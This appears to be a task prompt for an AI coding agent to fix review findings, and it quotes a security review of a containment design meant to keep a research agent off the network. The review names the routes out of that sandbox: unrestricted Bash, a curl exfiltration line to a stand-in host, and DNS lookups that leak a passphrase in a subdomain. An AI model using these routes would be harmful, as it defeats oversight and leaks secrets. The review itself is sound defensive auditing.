You are Michelangelo. Fix one round of review findings on a change that is
already built and already reviewed. Do not start the change again.

repo:         https://github.com/dniachini-droid/zibaldone
branch:       claude/the-research
head:         90663114766108832a9b2ad7aebe950fd7931b3d
pull-request: 26

Push your repairs to that same branch. Open no second pull request. The pull
request the owner is asked to merge is the one the review was about.

The scope page for this change is `projects/zibaldone/scope/the-research.md`
in Bottega, on branch `claude/virgil-kus0id`. Read it. It says what the thing
is for and what it must never do.

Both findings below block the merge. Each one, before it is merged:

  - is written as a test,
  - watched failing against the broken version,
  - watched passing against the fix,
  - and what you saw goes in `docs/REFUSALS.md`.

Watching it fail is not optional and not a formality: the review's whole point
is that these gaps were never once watched refusing anything. A test that has
only ever been seen passing cannot be told apart from one that cannot fire.

Do not buy a refusal with a change that stays. Bad inputs live beside the
tests as fixtures, or are a temporary edit put back afterwards.

The two claims the review says are false are in `research/rooms.js`'s own
comment and in `docs/REFUSALS.md`. Whatever you can no longer make true, say
so in those files plainly rather than leaving the sentence standing.

Run the whole suite where a browser exists, more than once, and say what you
saw.

Comment on the pull request when you finish, when you stop early, and when
you are blocked — and say which of the three it is. If this is larger than one
fix round, stopping and saying so, with what is fixed and what is not, is a
real answer and it will be taken as one.

Here is the review, in full and unedited.

---

context_isolation: true
reviewer_mode: fresh_eyes
branch_matches: true
head_matches: true
status_matches: true
diff_stat_matches: true

verdict: changes_required

The two-room design is the whole point of this change, and it does not hold. Both findings below are against the exact claim the PR makes: "the study cannot reach the world — by construction, watched, not by instruction."

**1. The study job's agent is given `Bash`, which reaches the world regardless of anything `research/rooms.js` seals.**

`.github/workflows/research.yml`, `study-asks` and `study-files` jobs, both run `claude-code-action` with `--allowedTools "Bash,Read,Write,Edit,Glob,Grep,Task"` — plain `Bash`, no command restriction. `tools/check-rooms.mjs`'s `FETCHING_TOOLS` list (`research/checks`... rather `tools/check-rooms.mjs:56`) only checks for `WebFetch` and `WebSearch`; it never flags `Bash`.

`rooms.js` itself names this exact hole in its own comment: *"a study that spawns curl has left the room, and nothing in this file can stop it... tools/check-rooms.mjs refusing a workflow that gives it one."* The workflow gives it one, and the check does not refuse it. The runner is plain `ubuntu-latest` with no egress restriction, so `curl https://x/$(...)`, or even a bare `node -e "require('https').get(...)"` (which never passes through `--import ./research/no-network.mjs` at all, since that seal is only applied to the specific `research/cli.js` invocations the skill prescribes, not to the job), reaches the open internet from a process holding `ZIBALDONE_MIND_TOKEN` and `ZIBALDONE_PASSPHRASE` in its environment. `SKILL.md` tells the agent to only ever run the sealed `research/cli.js` commands, but that is exactly the kind of prompt-level rule the PR's own design note says is followed "about nine times in ten" — the mechanism that's supposed to make it unconditional isn't there for anything the agent runs outside that exact command line.

**2. `sealTheStudy()` does not seal all six doors it claims to, even for code that never touches `Bash`.**

Reproduced live against the actual entrypoint (`node --import ./research/no-network.mjs`, from this checkout):

- `import { lookup } from 'node:dns'; lookup('example.com', cb)` — resolved to a real IP, unrefused. Node's ES-module named exports of builtin CJS modules are snapshotted at import and are not live-bound to later mutation of `mod.default`'s properties, so patching `mod.default.lookup` (what `rooms.js:115` does) never reaches a named import of the same function. Same holds for `http`/`https`/`net`/`tls`'s named exports — `import { request } from 'node:http'` resolves to the original.
- `(await import('node:dns')).default.resolveTxt('example.com', cb)` and `dns.promises.resolve4(...)` — both resolved real DNS records, unrefused, and this one doesn't even need the named-import gap: `sealTheStudy()` only patches `lookup`/`resolve`/`resolve4`/`resolve6` on `dns.default`, so `resolveTxt`, the rest of the `resolve*` family, and the entire `dns.promises` API were never touched by the seal at all.

`dns.lookup` alone is a complete, self-contained exfiltration channel (encode the passphrase into a subdomain label, call it) — no `http`/`https`/`net` needed. `rooms.js`'s comment ("Six doors... a test that watches each one refuse") and `docs/REFUSALS.md`'s write-up ("`research/no-network.mjs` seals six doors, and each was watched refusing on its own") both assert a completeness that isn't real: `test/rooms.test.js` only ever calls through `.default.<method>` (`DOORS` in that file, e.g. `(await import('node:https')).default.get(...)`), so this gap has never once been watched refusing anything — which is exactly the "checks never observed refusing anything" budget's blind spot in practice.

Neither finding touches the PII-scrubbing (`research/checks.js`) or the workflow-vs-skill static check (`tools/check-rooms.mjs`'s own logic), which read carefully and correctly for what they check. The gap in both cases above is that what's checked isn't the whole attack surface the design claims to close.
